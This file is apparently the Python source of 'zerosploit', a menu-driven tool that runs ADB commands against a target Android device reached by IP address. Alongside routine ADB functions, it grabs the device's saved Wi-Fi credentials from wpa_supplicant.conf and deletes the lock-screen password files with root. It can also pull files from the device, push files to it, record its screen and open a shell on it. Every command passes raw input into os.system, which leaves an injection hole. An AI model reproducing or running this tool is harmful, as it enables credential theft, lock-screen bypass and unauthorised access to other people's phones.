import os
from colorama import Fore, init
class methods:
    def __init__(self, name):
        pass
        
    def print_devices(self):
        os.system ("adb devices")
        
    def reboots_menu(self):
        print('''
    {0}[{1}1{0}]{2} reboot
    {0}[{1}2{0}]{2} reboot recovery
    {0}[{1}3{0}]{2} reboot bootloader
'''.format(Fore.CYAN, Fore.RED, Fore.GREEN))
        option = input(Fore.GREEN + "zerosploit"+Fore.RED + "(reboot) "+Fore.WHITE + "> ")
        target = input(Fore.GREEN + "zerosploit"+Fore.RED + "(set target) "+Fore.WHITE + "> ")
        if option == "1":
            os.system(f"adb -s {target} reboot")
        elif option == "2":
            os.system(f"adb -s {target} reboot recovery")
        elif option == "3":
            os.system(f"adb -s {target} reboot bootloader")
        else: print (Fore.RED+"error")
    
    def connect(self):
        print('''
    {0}[{1}1{0}]{2} connect
    {0}[{1}2{0}]{2} disconnect
'''.format(Fore.CYAN, Fore.RED, Fore.GREEN))
        option = input(Fore.GREEN + "zerosploit"+Fore.RED + "(connect manager) "+Fore.WHITE + "> ")
        target = input(Fore.GREEN + "zerosploit"+Fore.RED + "(input ip) "+Fore.WHITE + "> ")
        if option == "1":
            os.system (f"adb connect {target}")
        elif option == "2":
            os.system (f"adb disconnect {target}")
        else: print (Fore.RED+"error")
        
    def shell(self):
        target = input(Fore.GREEN + "zerosploit"+Fore.RED + "(input target ip) "+Fore.WHITE + "> ")
        os.system(f"adb -s {target} shell")
        
    def APK_management(self):
        print('''
    	{0}[{1}1{0}]{2} sdcard install
    	{0}[{1}2{0}]{2} installation in internal memory
    	{0}[{1}3{0}]{2} testing install
    	{0}[{1}4{0}]{2} reinstallation with data saving
    	{0}[{1}5{0}]{2} uninstall
    	{0}[{1}6{0}]{2} list all apps
    	{0}[{1}7{0}]{2} start app
    	{0}[{1}8{0}]{2} extract apk 
'''.format(Fore.CYAN, Fore.RED, Fore.GREEN))
        option = input(Fore.GREEN + "zerosploit"+Fore.RED + "(apk management) "+Fore.WHITE + "> ")
        if option == "5" or option == "7":
            apk = input(Fore.GREEN + "zerosploit"+Fore.RED + "(packet name) "+Fore.WHITE + "> ")
        elif option== "6":
            pass
        elif option == "8":
            apk = input(Fore.GREEN + "zerosploit"+Fore.RED + "(packet name) "+Fore.WHITE + "> ")
        else:
            apk = input(Fore.GREEN + "zerosploit"+Fore.RED + "(path to APK) "+Fore.WHITE + "> ")
        target = input(Fore.GREEN + "zerosploit"+Fore.RED + "(input valid ip) "+Fore.WHITE + "> ")
        if option == "1":
            os.system (f"adb -s {target} install {apk}")
        elif option == "2":
            os.system (f"adb -s {target} install -f {apk}")
        elif option == "3":
            os.system (f"adb -s {target} install -t {apk}")
        elif option == "4":
            os.system (f"adb -s {target} install -r {apk}")
        elif option == "5":
            os.system (f"adb -s {target} uninstall {apk}")
        elif option == "6":
            os.system(f"adb -s {target} shell pm list packages -f")
        elif option == "7":
            os.system(f"adb -s {target} shell monkey -p {apk} -v 500")
        elif option == "8":
            os.system(f"adb -s {target} shell pm path {apk}")
            path = input(Fore.GREEN + "zerosploit"+Fore.RED + "(input this ↑ address) "+Fore.WHITE + "> ")
            location = input(Fore.GREEN + "zerosploit"+Fore.RED + "(input location to save) "+Fore.WHITE + "> ")
            os.system(f"adb -s {target} pull {path} data/{location}")
        else: print (Fore.RED+"error")
        
    def screens(self):
        print('''
        {0}[{1}1{0}]{2} screenshot
        {0}[{1}2{0}]{2} screen record
'''.format(Fore.CYAN, Fore.RED, Fore.GREEN))
        option = input(Fore.GREEN + "zerosploit"+Fore.RED + "(screenshots) "+Fore.WHITE + "> ")
        target = input(Fore.GREEN + "zerosploit"+Fore.RED + "(target ip) "+Fore.WHITE + "> ")
        location = input(Fore.GREEN + "zerosploit"+Fore.RED + "(location to save) "+Fore.WHITE + "> ")
        if option == "1":
            os.system(f"adb -s {target} shell screencap /sdcard/screen.png")
            os.system(f"adb -s {target} pull /sdcard/screen.png screenshots/{location}")
        elif option == "2":
            os.system(f"adb -s {target} shell screenrecord /sdcard/demo.mp4")
            os.system(f"adb -s {target} pull /sdcard/demo.mp4 screenrecords/{location}")
        else: print (Fore.RED+"error")
        
    def log(self):
        target = input(Fore.GREEN + "zerosploit"+Fore.RED + "(target ip) "+Fore.WHITE + "> ")
        os.system(f"adb -s {target} logcat")
        
    def storage_manager(self):
        print('''
        {0}[{1}1{0}]{2} Pull files
        {0}[{1}2{0}]{2} Push files
'''.format(Fore.CYAN, Fore.RED, Fore.GREEN))
        option = input(Fore.GREEN + "zerosploit"+Fore.RED + "(target ip) "+Fore.WHITE + "> ")
        target = input(Fore.GREEN + "zerosploit"+Fore.RED + "(target ip) "+Fore.WHITE + "> ")
        file_path = input(Fore.GREEN + "zerosploit"+Fore.RED + "(file path) "+Fore.WHITE + "> ")
        save_path = input(Fore.GREEN + "zerosploit"+Fore.RED + "(save path) "+Fore.WHITE + "> ")
        if option == "1":
            os.system(f"adb -s {target} pull {file_path} data/{save_path}")
        elif option == "2":
            os.system(f"adb -s {target} push {file_path} {save_path}")
        
    def dumpsys(self):
        target = input(Fore.GREEN + "zerosploit"+Fore.RED + "(target ip) "+Fore.WHITE + "> ")
        os.system(f"adb -s {target} shell dumpsys") 
        
    def battery(self):
        target = input(Fore.GREEN + "zerosploit"+Fore.RED + "(target ip) "+Fore.WHITE + "> ")
        os.system(f"adb -s {target} shell dumpsys battery")
    
    def inter_manager(self):
        print('''
        {0}[{1}1{0}]{2} Port forwarding
        {0}[{1}2{0}]{2} Grab wpa_supplicant 
        {0}[{1}3{0}]{2} Show Mac/Inet 
        {0}[{1}4{0}]{2} Turn WiFi On/Off    
        {0}[{1}5{0}]{2} Netstat
'''.format(Fore.CYAN, Fore.RED, Fore.GREEN))
        option = input(Fore.GREEN + "zerosploit"+Fore.RED + "(internet manager) "+Fore.WHITE + "> ")
        target = input(Fore.GREEN + "zerosploit"+Fore.RED + "(target ip) "+Fore.WHITE + "> ")
        if option == "1":
            port_device = input(Fore.GREEN + "zerosploit"+Fore.RED + "(port device) "+Fore.WHITE + "> ")
            forward_port = input(Fore.GREEN + "zerosploit"+Fore.RED + "(forward port "+Fore.WHITE + "> ")
            os.system(f"adb -s {target} forward tcp:{port_device} tcp:{forward_port}") 
        elif option == "2":
	        location = input(Fore.GREEN + "zerosploit"+Fore.RED + "(save path) "+Fore.WHITE + "> ")
	        os.system(f"adb -s {target} pull /data/misc/wifi/wpa_supplicant.conf {location}")
        elif option == "3":
            print("            {0}!{1}does not work in all devices{0}!{2}".format(Fore.RED, Fore.GREEN, Fore.WHITE))
            os.system(f"adb -s {target} shell ip address show wlan0")
        elif option == "4":
            wfstat = input(Fore.GREEN + "zerosploit"+Fore.RED + "(input 'on' or 'off') "+Fore.WHITE + "> ")
            if wfstat == 'off': onoff = "disable"
            else: onoff = "enable"
            os.system(f"adb -s {target} shell svc wifi {onoff}")
        elif option == "5":
            os.system(f"adb -s {target} shell netstat")
        else: print (Fore.RED+"error")
        
    def rm_pass(self):
        target = input(Fore.GREEN + "zerosploit"+Fore.RED + "(target ip) "+Fore.WHITE + "> ")
        os.system(f"adb -s {target} shell su 0 'rm /data/system/gesture.key'")
        os.system(f"adb -s {target} shell su 0 'rm /data/system/locksettings.db'") 
        os.system(f"adb -s {target} shell su 0 'rm /data/system/locksettings.db-wal'") 
        os.system(f"adb -s {target} shell su 0 'rm /data/system/locksettings.db-shm'")
    
    def keycode(self):
        print (
Fore.GREEN+"List keycode numbers",Fore.WHITE+
'''
0 -->   "KEYCODE_UNKNOWN" 
1 -->   "KEYCODE_MENU" 
2 -->   "KEYCODE_SOFT_RIGHT" 
3 -->   "KEYCODE_HOME" 
4 -->   "KEYCODE_BACK" 
5 -->   "KEYCODE_CALL" 
6 -->   "KEYCODE_ENDCALL" 
7 -->   "KEYCODE_0" 
8 -->   "KEYCODE_1" 
9 -->   "KEYCODE_2" 
10 -->  "KEYCODE_3" 
11 -->  "KEYCODE_4" 
12 -->  "KEYCODE_5" 
13 -->  "KEYCODE_6" 
14 -->  "KEYCODE_7" 
15 -->  "KEYCODE_8" 
16 -->  "KEYCODE_9" 
17 -->  "KEYCODE_STAR" 
18 -->  "KEYCODE_POUND" 
19 -->  "KEYCODE_DPAD_UP" 
20 -->  "KEYCODE_DPAD_DOWN" 
21 -->  "KEYCODE_DPAD_LEFT" 
22 -->  "KEYCODE_DPAD_RIGHT" 
23 -->  "KEYCODE_DPAD_CENTER" 
24 -->  "KEYCODE_VOLUME_UP" 
25 -->  "KEYCODE_VOLUME_DOWN" 
26 -->  "KEYCODE_POWER" 
27 -->  "KEYCODE_CAMERA" 
28 -->  "KEYCODE_CLEAR" 
29 -->  "KEYCODE_A" 
30 -->  "KEYCODE_B" 
31 -->  "KEYCODE_C" 
32 -->  "KEYCODE_D" 
33 -->  "KEYCODE_E" 
34 -->  "KEYCODE_F" 
35 -->  "KEYCODE_G" 
36 -->  "KEYCODE_H" 
37 -->  "KEYCODE_I" 
38 -->  "KEYCODE_J" 
39 -->  "KEYCODE_K" 
40 -->  "KEYCODE_L" 
41 -->  "KEYCODE_M" 
42 -->  "KEYCODE_N" 
43 -->  "KEYCODE_O" 
44 -->  "KEYCODE_P" 
45 -->  "KEYCODE_Q" 
46 -->  "KEYCODE_R" 
47 -->  "KEYCODE_S" 
48 -->  "KEYCODE_T" 
49 -->  "KEYCODE_U" 
50 -->  "KEYCODE_V" 
51 -->  "KEYCODE_W" 
52 -->  "KEYCODE_X" 
53 -->  "KEYCODE_Y" 
54 -->  "KEYCODE_Z" 
55 -->  "KEYCODE_COMMA" 
56 -->  "KEYCODE_PERIOD" 
57 -->  "KEYCODE_ALT_LEFT" 
58 -->  "KEYCODE_ALT_RIGHT" 
59 -->  "KEYCODE_SHIFT_LEFT" 
60 -->  "KEYCODE_SHIFT_RIGHT" 
61 -->  "KEYCODE_TAB" 
62 -->  "KEYCODE_SPACE" 
63 -->  "KEYCODE_SYM" 
64 -->  "KEYCODE_EXPLORER" 
65 -->  "KEYCODE_ENVELOPE" 
66 -->  "KEYCODE_ENTER" 
67 -->  "KEYCODE_DEL" 
68 -->  "KEYCODE_GRAVE" 
69 -->  "KEYCODE_MINUS" 
70 -->  "KEYCODE_EQUALS" 
71 -->  "KEYCODE_LEFT_BRACKET" 
72 -->  "KEYCODE_RIGHT_BRACKET" 
73 -->  "KEYCODE_BACKSLASH" 
74 -->  "KEYCODE_SEMICOLON" 
75 -->  "KEYCODE_APOSTROPHE" 
76 -->  "KEYCODE_SLASH" 
77 -->  "KEYCODE_AT" 
78 -->  "KEYCODE_NUM" 
79 -->  "KEYCODE_HEADSETHOOK" 
80 -->  "KEYCODE_FOCUS" 
81 -->  "KEYCODE_PLUS" 
82 -->  "KEYCODE_MENU" 
83 -->  "KEYCODE_NOTIFICATION" 
84 -->  "KEYCODE_SEARCH" 
85 -->  "TAG_LAST_KEYCODE"        
        ''')
        target = input(Fore.GREEN + "zerosploit"+Fore.RED + "(target ip) "+Fore.WHITE + "> ")
        keycode = input(Fore.GREEN + "zerosploit"+Fore.RED + "(input keycode number) "+Fore.WHITE + "> ")
        os.system(f"adb -s {target} shell input keyevent {keycode}")
    
    def activity(self):
        target = input(Fore.GREEN + "zerosploit"+Fore.RED + "(target ip) "+Fore.WHITE + "> ")
        os.system(f"adb -s {target} dumpsys activity")
    
    def custom_command(self):
        command = input(Fore.GREEN + "zerosploit"+Fore.RED + "(input command) "+Fore.WHITE + "> ")
        os.system(f"adb {command}")
        
        
        
        
        
        
        
        
